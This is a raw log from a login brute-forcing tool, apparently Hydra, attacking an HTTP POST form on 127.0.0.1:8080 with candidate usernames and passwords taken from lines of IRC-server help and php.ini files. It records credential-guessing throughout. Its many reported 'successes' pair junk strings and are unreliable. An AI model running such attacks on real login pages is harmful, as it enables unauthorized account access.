[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the \"IRC Name\" (or \"Real Name\") of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to join a channel.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 566459 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the \"IRC Name\" (or \"Real Name\") of a user currently on the IRC network.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to join a channel.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 566460 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to join a channel.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to part a channel.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 566785 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to join a channel.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to part a channel.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 566786 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to join a channel.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to part a channel.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 566787 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to join a channel.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to part a channel.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 566788 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to part a channel.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " You can use TRACE on servers or users.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 567113 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to part a channel.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " You can use TRACE on servers or users.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 567114 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to part a channel.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " You can use TRACE on servers or users.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 567115 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to part a channel.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " You can use TRACE on servers or users.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 567116 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " You can use TRACE on servers or users.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " When used on a user it will give you class and lag info.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 567441 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " You can use TRACE on servers or users.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " When used on a user it will give you class and lag info.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 567442 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " You can use TRACE on servers or users.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " When used on a user it will give you class and lag info.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 567443 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " You can use TRACE on servers or users.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " When used on a user it will give you class and lag info.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 567444 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " When used on a user it will give you class and lag info.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Depending on whether you are a normal user or an oper";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 567769 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " When used on a user it will give you class and lag info.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Depending on whether you are a normal user or an oper";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 567770 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " When used on a user it will give you class and lag info.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Depending on whether you are a normal user or an oper";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 567771 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " When used on a user it will give you class and lag info.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Depending on whether you are a normal user or an oper";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 567772 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Depending on whether you are a normal user or an oper";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " -- normal user: --";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 568097 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Depending on whether you are a normal user or an oper";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " -- normal user: --";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 568098 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Depending on whether you are a normal user or an oper";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " -- normal user: --";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 568099 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Depending on whether you are a normal user or an oper";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " -- normal user: --";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 568100 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " -- normal user: --";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the nickname of the user in question.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 568425 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " -- normal user: --";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the nickname of the user in question.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 568426 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " -- normal user: --";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the nickname of the user in question.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 568427 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " -- normal user: --";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the nickname of the user in question.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 568428 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the nickname of the user in question.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the mode of the User in question.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 568753 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the nickname of the user in question.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the mode of the User in question.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 568754 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the nickname of the user in question.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the mode of the User in question.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 568755 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the nickname of the user in question.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the mode of the User in question.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 568756 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the mode of the User in question.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSMODE <nickname> <usermode>";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 569081 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the mode of the User in question.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSMODE <nickname> <usermode>";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 569082 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the mode of the User in question.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSMODE <nickname> <usermode>";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 569083 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the mode of the User in question.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSMODE <nickname> <usermode>";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 569084 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSMODE <nickname> <usermode>";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forcefully disconnects a user from the network.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 569409 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSMODE <nickname> <usermode>";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forcefully disconnects a user from the network.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 569410 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSMODE <nickname> <usermode>";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forcefully disconnects a user from the network.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 569411 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSMODE <nickname> <usermode>";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forcefully disconnects a user from the network.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 569412 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forcefully disconnects a user from the network.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSKILL <user> :<reason>";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 569737 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forcefully disconnects a user from the network.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSKILL <user> :<reason>";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 569738 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forcefully disconnects a user from the network.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSKILL <user> :<reason>";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 569739 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forcefully disconnects a user from the network.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSKILL <user> :<reason>";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 569740 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSKILL <user> :<reason>";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to join a channel.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 570065 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSKILL <user> :<reason>";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to join a channel.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 570066 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSKILL <user> :<reason>";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to join a channel.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 570067 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSKILL <user> :<reason>";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to join a channel.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 570068 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to join a channel.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to leave a channel.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 570393 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to join a channel.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to leave a channel.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 570394 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to join a channel.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to leave a channel.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 570395 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to join a channel.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Forces a user to leave a channel.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 570396 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to leave a channel.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the Usermode of a nickname and displays";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 570721 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to leave a channel.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the Usermode of a nickname and displays";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 570722 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to leave a channel.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the Usermode of a nickname and displays";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 570723 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Forces a user to leave a channel.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the Usermode of a nickname and displays";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 570724 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the Usermode of a nickname and displays";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " the change to the user.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 571049 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the Usermode of a nickname and displays";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " the change to the user.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 571050 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the Usermode of a nickname and displays";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " the change to the user.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 571051 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the Usermode of a nickname and displays";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " the change to the user.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 571052 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " the change to the user.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVS2MODE <nickname> <usermodes>";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 571377 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " the change to the user.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVS2MODE <nickname> <usermodes>";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 571378 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " the change to the user.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVS2MODE <nickname> <usermodes>";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 571379 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " the change to the user.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVS2MODE <nickname> <usermodes>";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 571380 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVS2MODE <nickname> <usermodes>";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:help Svslusers {" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 571705 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVS2MODE <nickname> <usermodes>";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:help Svslusers {" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 571706 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVS2MODE <nickname> <usermodes>";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:help Svslusers {" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 571707 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVS2MODE <nickname> <usermodes>";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:help Svslusers {" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 571708 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:help Svslusers {   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the global and/or local maximum user count";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 572033 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:help Svslusers {   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the global and/or local maximum user count";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 572034 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:help Svslusers {   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the global and/or local maximum user count";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 572035 of 577936 [child 3] (0/0)
